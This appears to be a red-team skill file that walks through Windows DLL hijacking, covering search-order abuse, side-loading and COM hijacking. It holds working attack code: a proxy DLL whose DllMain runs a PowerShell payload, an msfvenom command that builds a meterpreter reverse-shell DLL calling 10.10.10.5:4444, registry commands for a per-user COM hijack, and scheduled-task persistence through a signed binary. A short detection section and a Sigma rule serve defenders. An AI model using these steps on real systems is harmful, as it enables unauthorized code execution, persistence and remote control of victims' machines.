<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-dll-hijacking
description: >-
  Exploit DLL search order and side-loading vulnerabilities for persistence
  and privilege escalation on Windows. Covers phantom DLL hijacking, search
  order abuse, and COM object hijacking.
domain: cybersecurity
subdomain: red-team
tags:
  - dll-hijacking
  - persistence
  - privilege-escalation
  - windows
  - side-loading
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1574.001", "T1574.002", "T1546.015"]
  tools: ["procmon", "dll-hijack-scanner", "msfvenom", "mingw"]
---

# Performing DLL Hijacking

## Overview

DLL hijacking abuses Windows DLL search order to load attacker-controlled
libraries. When an application searches for a DLL, it checks directories in
a predictable order — placing a malicious DLL earlier in the path achieves
code execution in the context of the loading process.

## Prerequisites

- Access to writable directory in DLL search path
- Knowledge of target application's DLL dependencies
- Cross-compiler for DLL generation (`apt install mingw-w64`)

```bash
apt install mingw-w64
```

## Key Concepts

### Windows DLL Search Order

| Priority | Location |
|----------|----------|
| 1 | Application directory |
| 2 | System directory (C:\Windows\System32) |
| 3 | 16-bit system directory |
| 4 | Windows directory |
| 5 | Current directory |
| 6 | PATH directories |

### Hijack Types

| Type | Description |
|------|-------------|
| Phantom DLL | Application loads DLL that doesn't exist |
| Search order | DLL exists but writable location is earlier |
| Side-loading | Signed app loads from its directory first |
| COM hijacking | Override COM object DLL in registry |

## Workflow

### Step 1: Identify Missing DLLs with Procmon

```
# Procmon filters:
# Operation = CreateFile
# Result = NAME NOT FOUND
# Path ends with .dll

# Export results to CSV for analysis
# Look for DLLs loaded from writable locations
```

### Step 2: Automated Discovery

```bash
# PowerShell — find writable directories in PATH
$env:PATH -split ';' | ForEach-Object {
    $acl = Get-Acl $_ -ErrorAction SilentlyContinue
    if ($acl) { "$_ : $($acl.Access | Where-Object {$_.IdentityReference -match 'Users|Everyone'})" }
}

# Find applications loading from CWD
Get-Process | ForEach-Object {
    $_.Modules | Where-Object { $_.FileName -notmatch 'System32|SysWOW64' }
} | Select-Object FileName -Unique
```

### Step 3: Create Proxy DLL

```c
// proxy_dll.c — forwards calls to real DLL while executing payload
#include <windows.h>

// Forward exports to real DLL
#pragma comment(linker, "/export:RealFunction=original.RealFunction")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload — reverse shell, beacon, etc.
        WinExec("cmd.exe /c powershell -ep bypass -f C:\\temp\\payload.ps1", 0);
    }
    return TRUE;
}
```

```bash
# Compile with MinGW
x86_64-w64-mingw32-gcc -shared -o target.dll proxy_dll.c -lws2_32

# Or generate with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 \
  -f dll -o hijack.dll
```

### Step 4: COM Object Hijacking

```powershell
# Find hijackable COM objects — InprocServer32 pointing to missing DLLs
$clsids = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -Recurse |
    Get-ItemProperty -Name "(Default)" -ErrorAction SilentlyContinue

# Set per-user COM hijack (HKCU takes priority over HKLM)
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\{TARGET-CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\{TARGET-CLSID}\InprocServer32" `
  -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Step 5: Persistence via Scheduled Task Side-Loading

```bash
# Find signed Microsoft binaries that side-load DLLs
# Common targets: OneDrive, Teams, Edge updater

# Copy signed binary + malicious DLL to writable location
copy "C:\Program Files\App\signed.exe" C:\Users\user\AppData\Local\
copy evil.dll C:\Users\user\AppData\Local\target.dll

# Create scheduled task for persistence
schtasks /create /tn "Updater" /tr "C:\Users\user\AppData\Local\signed.exe" /sc onlogon
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| DLL load anomaly | Sysmon Event 7 | DLL loaded from unusual path |
| Unsigned DLL | EDR | Unsigned DLL in signed process |
| Registry modification | Sysmon Event 13 | CLSID InprocServer32 changes |
| New file in PATH | File monitoring | DLL created in writable PATH directory |

```yaml
title: DLL Side-Loading — Unsigned DLL in Signed Process
id: e5f60718-9203-1234-ef01-234567890123
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 7
    Signed: "false"
  filter:
    ImageLoaded|startswith:
      - "C:\\Windows\\System32\\"
      - "C:\\Windows\\SysWOW64\\"
  condition: selection and not filter
falsepositives:
  - Third-party software with unsigned DLLs
level: medium
tags:
  - attack.t1574.002
  - attack.persistence
```

## Verification

- [ ] Missing/hijackable DLLs identified
- [ ] Proxy DLL compiled and placed
- [ ] Code execution confirmed in target process context
- [ ] Persistence mechanism established
- [ ] Detection artifacts documented

## References

- [DLL Hijacking](https://attack.mitre.org/techniques/T1574/001/)
- [MITRE T1574.002](https://attack.mitre.org/techniques/T1574/002/)
- [Hijack Libs](https://hijacklibs.net/)
